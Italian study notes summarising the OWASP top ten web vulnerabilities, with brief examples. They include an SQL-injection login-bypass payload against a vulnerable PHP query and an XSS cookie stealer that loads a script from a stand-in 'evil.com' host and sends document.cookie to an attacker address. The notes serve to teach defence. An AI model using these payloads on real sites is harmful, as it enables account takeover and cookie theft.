Gli accorgimenti di sicurezza non si devono peró fermare al livello applicativo, ma devono coprire anche le azioni dell'utente.

Per valutare queste problematiche utilizziamo la classifica **OWASP**(classifica dei problemi di sicurezza piú gravi).
## 1. Injection
Invio di codice arbitrario all'applicazione, che viene eseguito lato server.

Alcuni esempi tra i piú noti sono l'sql injection e il buffer overflow.

É possibile peró evitare attacchi di questo tipo "sanificando" l'input dell'utente.
### Esempio: SQL-injection, authentication bypass
Immaginiamo di avere su una pagina web PHP un form di login, richiedente username e password per l'accesso ad una dashboard. La pagina effettua una richiesta al database relazionale direttamete o si interfaccia con un controller per chiedere se i dati inseriti sono corretti.

Immaginiamo che la query sia 
```php
$username = $_POST['user'];
$password = $_POST['password'];
$query -> "select * from users where username='$username' and password='$password'";
```
notiamo che non viene fatta alcun controllo sull input, quindi un'attaccante é in grado di bypassare l'autenticazione con una semplice richiesta web con payload
```
user=admin'--
```
> Si suppone che esista l'utente admin e che la logica del codice PHP restante implementi il login.
## 2. XSS - Cross site scripting
É una vulnerabilitá che permette a un attaccante di manipolare un sito vulnerabile per far eseguire del codice Javascript malevolo ad un utente.

Uno script può essere eseguito sul Browser della vittima, facendo in modo che i parametri del Browser relativi al sito target (in particolare I cookies) vengano intercettati.

Si dividono in due categorie: 
- **reflected XSS**: quello sopra descritto
- **stored XSS**: quando un'applicazione riceve un'input malevolo e lo include nelle risposte HTTP future in una faniera non sicura[1](https://portswigger.net/web-security/cross-site-scripting/stored)
### Esempio: Reflected XSS - Cookie stealer con phising
Immaginiamo che un sito abbia una form per i contatti, dove é possibile inserire il link al proprio sito.

La richiesta di contatto viene renderizzata dal browser sul pannello amministratore in un tag HTML *p* senza essere sanitizzato, come segue
```html
<!-- site=http://input-site.com -->
<p>Site: http://input-site.com</p>
```
Un attaccante puó quindi inserire codice javascript che viene eseguito dal browser.
```html
<!-- site=<script>alert(1)</script> -->
<p><script>alert(1)</script></p>
```
Si puó inoltre allegare una richiesta a un file js di nostro possesso, mettere in ascolto una reverse-shell e far effettuare la richiesta dal browser dell'attaccante(anche se finiremo nella sandbox del browser) oppure rubare il cookie dell'utente che visualizzerá la pagina:
```html
<p><script src="http://evil.com/pwn.js"></script></p>
```
```js
//pwn.js
var i=new Image();
i.src="http://evil-ip:/?"+document.cookie;
```
mettendo in ascolto un server HTTP per ricevere la richiesta.
## 3. Broken Authentication & session management
**Broken autentication**: l’autenticazione utente viene resa vana, ovvero un utente non autorizzato riesce ad autenticarsi.
**Broken Session management**: un utente non autorizzato riesce ad inserirsi all’interno di una sessione di un utente autorizzato.
## 4. Insecure direct object references(IDOR)
Un tipo di vulnerabilitá sul controllo degli accessi che sorge quando un'applicazione usa un'input utent per accedere agli oggetti direttamente.

Per esempio la pagina del proprio profilo utente, visualizzabile dopo l'autenticazione
``` https://insecure-website.com/customer_account?customer_number=132355``` 
effettua un riferimento diretto al database di backend, e questo rende accessibili i profili di altri utenti semplicemente modificando i valore del campo `customed_id`.
## 5. Cross site request forgery
É una vulnerabilitá che permette ad un attaccante di indurre azioni ad un utente che non aveva intenzione di compiere.

Un sito permette operazioni critiche agli utenti autorizzati previa autenticazione, durante la stessa sessione.
Lo stesso utente autorizzato apre una pagina fraudolenta in un’altra scheda, che lo porta ad richiedere una diversa operazione, all’interno della sessione autenticata:

Permette di bypassare la same-origin policy, che evita che piú pagine interferiscano tra di esse, per esempio sfruttando iframe collegati a siti malevoli.
## 6. Security Misconfiguration
Ad esempio:
1. Il framework di sviluppo non è aggiornato
2. Installo un pacchetto lato server ma non cambio gli utenti di default (es. user admin, password admin)
3. Directory listing in Apache
### Esempio: CSM con credenziali di default
Un sito gestito tramite CMS(_Content Management_ System), come ad esempio wordpress o drupal, presenta le credenziali di default o un file di configurazione con le credenziali in chiaro
## 7. Insecure cryptographic storage
Ad esempio:
- Dati riservati sono memorizzati in chiaro, oppure la chiave è memorizzata in chiaro, sul server o sui backup
- Password e chiavi crittografiche deboli rispetto a guessing e cracking
- Password “unsalted”
## 8. Failure to restrict URL access
Un utente é in grado di raggiungere pagine di un sito che richiederebbero autenticazione senza autenticarsi.
## 9. Insufficient transport layer protection
- SSL solo su alcune delle pagine o componenti riservate.
- Certificati scaduti o con CA non riconosciute.
- In generale, possibilità di intercettare il traffico (es. Arp / DNS spoofing)
## 10. Unvalidated redirects and forwards
L’utente prevede delle pagine che ridirezionano l’utente verso una URL ottenuta a partire da un parametro – l’utente può cliccare su un link che lo porta al sito, ma poi lo ridireziona su un sito pericoloso.

Stessa cosa per i forward interni
## Altre vulnerabilitá
- **DOS** (OWASP top ten – entry A9 – nel 2004), es.:
	- syn flooding
	- “smurf”
- **Insufficient Anti-automation**, es.: 
	- biometrics
	- captcha
- **Phishing**
- Metodi di **autenticazione** per online banking
	es.:
	- one time passwords
	- password dispositive
	- SSL client authentication
	- autenticazione con firma elettronica
## Metologia OWASP
La top ten di OWASP viene sviluppata basandosi su questa tabella:
![[Pasted image 20230904220337.png]]

Chiaramente non è possibile trovare un threat agent né un business impact poiché sono dipendenti dalla situazione in cui ci troviamo. 

Tutte le altre variabili sono invece definite solamente dal tipo di vulnerabilità: 
- **Attack vectors**: **quanto** è **facile** **effettuare** un attacco sfruttando quella vulnerabilità. 
- **Weakness prevalence**: **quanto** è **diffusa** la vulnerabilità. 
- **Weakness detectability**: **quando** è **facile** **scoprire** la vulnerabilità. 
- **Tech impact**: **quali** sono gli **impatti tecnologici** a fronte di un attacco sfruttando quella vulnerabilità.